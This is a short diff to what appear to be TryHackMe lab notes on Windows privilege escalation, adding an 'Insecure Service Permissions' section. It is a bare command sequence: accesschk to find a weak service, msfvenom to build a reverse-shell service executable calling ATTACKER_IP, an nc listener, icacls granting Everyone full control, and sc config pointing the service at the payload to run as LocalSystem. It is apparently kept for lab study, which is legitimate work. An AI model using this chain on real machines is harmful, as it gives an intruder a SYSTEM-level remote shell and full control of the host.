@@ -52,6 +52,15 @@ move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
 C:\> sc stop "disk sorter enterprise"
 C:\> sc start "disk sorter enterprise"
 
+Insecure Service Permissions
+
+accesschk64.exe -qlc thmservice
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+nc -lvp 4447
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+C:\> sc stop THMService
+C:\> sc start THMService
 
 
 
